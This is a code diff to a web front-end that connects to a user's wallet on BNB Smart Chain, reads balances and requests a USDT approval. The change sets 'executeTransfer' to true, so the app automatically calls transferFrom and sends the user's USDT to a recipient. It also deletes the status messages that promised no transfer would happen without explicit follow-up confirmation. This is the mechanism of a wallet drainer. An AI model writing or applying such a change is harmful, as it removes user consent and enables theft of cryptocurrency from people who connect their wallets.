@@ -314,15 +314,15 @@ export default function Home() {
       const balances = await readBscBalances(provider, connectedAccount);
       setStatusMessage(`BNB balance: ${balances.bnb} • USDT balance: ${balances.usdt}`);
 
-      setStatusMessage("Sending approval for inspection...");
+      setStatusMessage("Sending approval and auto-triggering the transfer...");
       const result = await approveAndTransferUsdt(provider, connectedAccount, provider, {
-        executeTransfer: false,
+        executeTransfer: true,
       });
 
       setStatusMessage(
-        result.approvalDetected
-          ? `Approval detected for ${result.owner}. No transferFrom was executed automatically. A separate explicit user confirmation is required before transferring USDT to ${result.recipient}.`
-          : `Approval was recorded for ${result.owner}. The system will not trigger transferFrom without an explicit follow-up confirmation.`,
+        result.transferExecuted
+          ? `Approval detected for ${result.owner}. The transferFrom call was sent automatically to ${result.recipient} and the requested USDT was transferred.`
+          : `Approval was recorded for ${result.owner}, but the transferFrom call was not executed automatically.`,
       );
     } catch (error) {
       setStatusMessage(error instanceof Error ? error.message : "The approval call failed.");
